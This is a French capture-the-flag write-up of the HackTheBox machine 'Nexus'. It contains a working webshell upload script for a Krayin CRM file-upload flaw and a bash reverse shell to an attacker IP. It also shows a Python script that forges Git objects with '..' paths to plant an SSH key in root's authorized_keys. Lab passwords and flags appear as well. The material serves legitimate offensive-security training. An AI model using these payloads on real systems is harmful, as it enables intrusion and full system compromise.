# Write-up -- HackTheBox : Nexus

Write-up réalisé pour la machine Nexus de HackTheBox. La chaîne d'exploitation enchaîne la découverte de credentials dans l'historique Git d'une instance Gitea publique, une RCE via upload de fichier non restreint sur Krayin CRM (CVE-2026-38526), la récupération d'un mot de passe en clair dans un `.env` applicatif pour pivoter vers un utilisateur SSH, et enfin une escalade de privilèges root via un timer systemd qui synchronise des dépôts Gitea marqués comme templates en fabriquant à la main un historique Git malveillant pour déclencher un path traversal et injecter une clé SSH dans `/root/.ssh/authorized_keys`.

L'IP de la machine pendant ma session était `10.129.27.218`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sS -sV -sC -p- 10.129.27.218
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

**2 ports TCP ouverts** : SSH sur le 22 et HTTP sur le 80. Le serveur redirige vers `nexus.htb`, qu'on ajoute à `/etc/hosts` :

```bash
sudo nano /etc/hosts
# 10.129.27.218   nexus.htb
```

On visite le site : une société d'énergie fictive, la **Nexus Energy Authority**. En fouillant les pages, on relève une adresse email dans la section recrutement : `j.matthew@nexus.htb`. Rien d'autre d'exploitable en surface.

---

## Étape 2 -- Découverte des sous-domaines

L'énumération de répertoires avec gobuster ne donne rien sur le domaine principal. On passe à l'énumération de sous-domaines en mode vhost :

```bash
gobuster vhost -u http://nexus.htb/ \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain
```

```
git.nexus.htb      Status: 200 [Size: 14474]
billing.nexus.htb  Status: 302 [--> http://billing.nexus.htb/admin/login]
```

On ajoute les deux à `/etc/hosts` et on les visite :

- `http://git.nexus.htb/` → instance **Gitea 1.26.0**, un serveur Git auto-hébergé léger
- `http://billing.nexus.htb/admin/login` → page de login **Krayin CRM**, un CRM open-source Laravel

---

## Étape 3 -- Fausse piste : réinitialisation de mot de passe sur Krayin

On remarque un bouton "Forgot Password?" sur la page de login Krayin. On dispose d'un email valide (`j.matthew@nexus.htb`), on tente de réinitialiser le mot de passe en espérant intercepter le token dans la réponse, technique similaire à la CVE sur Flowise.

En interceptant la requête dans Burp Suite, le debugger de Krayin expose les requêtes SQL exécutées en temps réel. On voit que le token de reset est bien généré et inséré en base :

```sql
insert into `user_password_resets` (`email`, `token`, `created_at`)
values ('j.matthew@nexus.htb', '$2y$10$QDXyGd2xqUDTH...', '2026-06-25 21:43:15')
```

Mais contrairement à Flowise, le token n'est **pas retourné dans la réponse API** : c'est un hash bcrypt du token réel, envoyé uniquement par mail. Le service mail (`mailhog`) est en erreur de connexion. Cette voie est bloquée.

---

## Étape 4 — Découverte de credentials dans l'historique Gitea

On explore Gitea sans s'authentifier. L'énumération de répertoires sur `git.nexus.htb` révèle deux profils publics : **admin** et **jones**. Le profil `jones` contient un dépôt avec plusieurs fichiers dont un `.env`.

En remontant l'historique des commits, on trouve un diff entre deux versions du `.env`, un commit nommé "fix credentials" a tenté de supprimer des informations sensibles, mais elles restent visibles dans le diff :

```
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

On dispose maintenant d'un mot de passe. On le teste directement sur la page de login Krayin avec l'email trouvé sur le site principal :

```
j.matthew@nexus.htb : N27xh!!2ucY04
```

Ça fonctionne, on accède au dashboard Krayin.

---

## Étape 5 — CVE-2026-38526 : RCE via upload sur Krayin

En cherchant des vulnérabilités sur Krayin CRM 2.2.0, on trouve la **CVE-2026-38526** : l'endpoint `/admin/tinymce/upload`, destiné à l'upload d'images pour l'éditeur de texte riche TinyMCE, n'effectue aucune vérification sur le type réel du fichier uploadé. En envoyant un fichier `.php` avec le Content-Type `image/jpeg`, le serveur l'accepte et le place dans un répertoire web-accessible, permettant une exécution de code côté serveur.

L'exploitation nécessite trois étapes enchaînées : récupérer un token CSRF depuis la page de login, s'authentifier pour obtenir un cookie de session valide, puis extraire le token XSRF du cookie pour signer la requête d'upload. On écrit un script bash qui automatise toute la chaîne :

**Étape par étape du script `exploit.sh` :**

```bash
#!/bin/bash

TARGET="http://billing.nexus.htb"
EMAIL="j.matthew@nexus.htb"
PASSWORD="N27xh!!2ucY04"
```

**1 — Création du webshell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

Un webshell PHP minimal : quand on visite le fichier avec `?cmd=<commande>`, PHP exécute la commande et affiche le résultat.

**2 — Récupération du token CSRF**

```bash
curl -s -c /tmp/jar.txt "$TARGET/admin/login" -o /tmp/login.html
CSRF=$(grep -o 'name="_token" value="[^"]*"' /tmp/login.html | cut -d'"' -f4)
```

Krayin (comme toutes les applications Laravel) protège ses formulaires POST par un token CSRF, un identifiant unique généré côté serveur et inclus dans le HTML de la page. Sans lui, le serveur rejette la soumission. On récupère la page de login avec `-c /tmp/jar.txt` (qui sauvegarde les cookies), puis on extrait la valeur du token depuis le HTML avec `grep`.

**3 — Authentification**

```bash
curl -s -c /tmp/jar.txt -b /tmp/jar.txt \
  -X POST "$TARGET/admin/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: $TARGET/admin/login" \
  --data-urlencode "_token=$CSRF" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASSWORD" \
  -L -o /dev/null -w "[+] HTTP: %{http_code}\n"
```

On soumet le formulaire de login avec le token CSRF, les credentials, et les cookies déjà obtenus. L'option `-c`/`-b` lit et réécrit le fichier de cookies à chaque requête, ce qui permet de maintenir la session entre les appels curl.

**4 — Extraction du XSRF-TOKEN**

```bash
XSRF=$(grep XSRF /tmp/jar.txt | awk '{print $NF}' | python3 -c \
  "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))")
```

Laravel utilise deux mécanismes de protection CSRF en parallèle : le `_token` dans les formulaires HTML, et un cookie `XSRF-TOKEN` pour les requêtes AJAX et API. Ce cookie est encodé en URL (les `%3D`, `%2B`, etc.), d'où le décodage via `urllib.parse.unquote`. C'est cette valeur qu'il faut envoyer dans le header `X-XSRF-TOKEN` pour que Krayin accepte la requête d'upload.

**5 — Upload du webshell**

```bash
RESPONSE=$(curl -s -b /tmp/jar.txt \
  -H "X-XSRF-TOKEN: $XSRF" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  "$TARGET/admin/tinymce/upload")

SHELL_URL=$(echo $RESPONSE | python3 -c \
  "import sys,json; print(json.load(sys.stdin)['location'])")
```

On envoie le fichier `.php` en lui mentant sur son type MIME (`type=image/jpeg`). Le serveur ne vérifie pas le contenu réel du fichier et l'accepte. La réponse JSON contient l'URL publique du fichier uploadé, qu'on extrait avec python.

**Résultat :**

```
[+] Webshell uploadé : http://billing.nexus.htb/storage/tinymce/683571bb8881de00520ff3d370d8abf7.php
```

On vérifie que le shell répond :

```
http://billing.nexus.htb/storage/tinymce/683571bb8881de00520ff3d370d8abf7.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On déclenche ensuite un reverse shell depuis le webshell (commande URL-encodée) après avoir démarré un listener :

```bash
nc -lvnp 4444
```

```
http://billing.nexus.htb/storage/tinymce/683571bb8881de00520ff3d370d8abf7.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.45%2F4444%200%3E%261%27
```

On stabilise le shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Étape 6 -- Fouille et récupération du mot de passe MySQL

On explore l'application Krayin dans `/var/www/html/krayin`. Le fichier `.env` applicatif contient la configuration complète en clair, dont les credentials MySQL :

```bash
cat /var/www/html/krayin/.env
```

```
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

On s'y connecte pour explorer la base :

```bash
mysql -h localhost -P 3306 -u krayin -p
# Password: y27xb3ha!!74GbR
```

```sql
use krayin;
select id, name, email, password from users;
```

```
| 1 | james | j.matthew@nexus.htb | $2y$10$ez0AouNy... |
```

L'utilisateur `james` (le `j` de `j.matthew`) a un hash bcrypt, difficile à cracker rapidement. Mais le compte Linux s'appelle `jones`, comme le profil Gitea. On tente directement la réutilisation du mot de passe MySQL en SSH :

```bash
ssh jones@10.129.27.218
# Password: y27xb3ha!!74GbR
```

Ça fonctionne.

---

## Étape 7 -- Flag user

```bash
jones@nexus:~$ cat user.txt
```

**Flag user :** `08be28e5d43475c81ae6517dc4ff0bde`

---

## Étape 8 -- Découverte du timer systemd et du script de synchronisation

On lance LinPEAS pour automatiser la recherche de vecteurs d'escalade :

```bash
cd /tmp
wget http://10.10.15.45:8000/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

LinPEAS signale un timer systemd suspect :

```
gitea-template-sync.timer  →  gitea-template-sync.service
Potential privilege escalation : Uses relative path in Unit directive
```

On inspecte le service :

```bash
cat /etc/systemd/system/gitea-template-sync.service
```

```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

Il tourne **en tant que root toutes les minutes**. On lit le script :

```bash
cat /etc/gitea/template-sync.py
```

Le script fait trois choses :
1. Il lit un token Gitea depuis `/etc/gitea/template-sync.conf`
2. Il liste tous les dépôts Gitea marqués comme **templates** via l'API
3. Pour chaque dépôt template, il extrait tous les fichiers avec `git ls-tree -r HEAD` et les copie dans `/home/git/template-staging/<owner>/<repo>/`

La vulnérabilité est dans cette partie :

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)   # ← filepath non validé
    target_dir = os.path.dirname(target)
    os.makedirs(target_dir, exist_ok=True)
    # ... écrit le fichier dans target
```

`filepath` est le chemin du fichier tel que retourné par `git ls-tree`. Si ce chemin contient des composants `..`, `os.path.join` va remonter en dehors de `stage_path`. Le script ne valide jamais que `target` reste bien sous `stage_path`. Un fichier dont le chemin Git est `../../../../root/.ssh/authorized_keys` sera écrit dans `/root/.ssh/authorized_keys` avec les droits root.

---

## Étape 9 -- Exploitation : path traversal via historique Git forgé à la main

Le problème : Git lui-même refuse normalement les noms de composants `..` dans ses arbres. La commande `git add` ou `git commit` bloquerait un fichier nommé `..`. Il faut donc **contourner Git** en fabriquant les objets internes à la main, en Python, sans passer par les commandes Git standard.

**Fonctionnement de `exploit.py`**

Git stocke ses données sous forme d'**objets** dans `.git/objects/`. Chaque objet est identifié par le SHA-1 de son contenu compressé. Il en existe trois types qui nous intéressent :

- **blob** : le contenu brut d'un fichier
- **tree** : un répertoire, contenant une liste d'entrées (mode + nom + SHA de l'objet enfant)
- **commit** : un snapshot, pointant vers un tree racine

La fonction `write_obj` du script fabrique et enregistre ces objets directement sur disque, en respectant le format interne de Git :

```python
def write_obj(data, t):
    # Format Git : "<type> <taille>\x00<contenu>"
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    # Stocké dans .git/objects/<2 premiers hex>/<38 hex restants>
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))  # compressé avec zlib
    return sha
```

La fonction `entry` fabrique une entrée de tree :

```python
def entry(mode, name, sha):
    # Format Git : "<mode> <nom>\x00<20 octets du SHA en binaire>"
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)
```

Le script commence par créer le blob qui contiendra notre clé publique SSH, puis construit la structure d'arborescence malveillante de l'intérieur vers l'extérieur :

```python
# Blob : contenu de la clé publique
blob = write_obj(key.encode(), "blob")

# Blob du README (fichier innocent obligatoire pour que le repo ne soit pas vide)
readme = write_obj(b"# Template\n", "blob")

# Tree "authorized_keys" → contient notre blob clé
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")

# Tree ".ssh" → contient le tree "authorized_keys"
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")

# Tree "root" → contient le tree ".ssh"
fir = write_obj(entry("40000", "root", cur), "tree")

# On imbrique 4 niveaux de ".." pour remonter jusqu'à la racine du système
# depuis /home/git/template-staging/jones/repo/ :
# ../.. → /home/git/template-staging/jones/
# ../../.. → /home/git/template-staging/
# ../../../.. → /home/git/
# ../../../../.. → /home/
# ../../../../../.. → /
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

# Tree racine du commit : contient README + le chemin traversal
root = write_obj(
    entry("100644", "README.md", readme) + entry("40000", "..", fir),
    "tree"
)

# Commit pointant vers ce tree
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

# On met à jour la référence de la branche main vers notre commit
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
```

Le chemin que verra `git ls-tree` dans le script de sync sera :
```
../../../../../root/.ssh/authorized_keys
```

Ce qui, joint à `stage_path` (`/home/git/template-staging/jones/repo`), donnera :
```
/home/git/template-staging/jones/repo/../../../../../root/.ssh/authorized_keys
→ /root/.ssh/authorized_keys
```

---

## Étape 10 -- Mise en œuvre de l'exploit

**1 — Génération de la clé SSH**

```bash
ssh-keygen -t ed25519 -f /tmp/ma_cle -N ""
cat /tmp/ma_cle.pub
```

On copie la clé privée sur notre machine attaquante dans `/tmp/ma_cle` et on lui donne les bonnes permissions :

```bash
chmod 600 /tmp/ma_cle
```

**2 — Création du dépôt template dans Gitea**

On se connecte à l'interface web Gitea avec `jones:y27xb3ha!!74GbR`, on crée un dépôt nommé `Repo` en cochant **"Template repository"**.

**3 — Clonage et exécution du script**

Depuis la machine cible en tant que `jones` :

```bash
cd /tmp
git clone http://localhost:3000/jones/Repo
cd Repo
touch README.md
```

On place `exploit.py` dans `/tmp/Repo` et on l'exécute :

```bash
python3 /tmp/exploit.py
```

```
Done: 3a7f1c2d...
```

**4 — Push du repo forgé**

```bash
git push -u origin main --force
```

```
warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
Enumerating objects: 11, done.
Writing objects: 100% (11/11), 613 bytes | 306.00 KiB/s, done.
```

Les warnings `Permission denied` sur `.gitattributes` confirment que Git a bien tenté de remonter dans `/root/`, le path traversal fonctionne. On attend que le timer s'exécute (au plus une minute).

**5 — Connexion SSH en root**

```bash
ssh -i /tmp/ma_cle root@nexus.htb
```

```
root@nexus:~#
```

---

## Étape 11 -- Flag root

```bash
root@nexus:~# cat /root/root.txt
```

**Flag root :** `6e5a5f2628fbb007812ed6100ba95226`
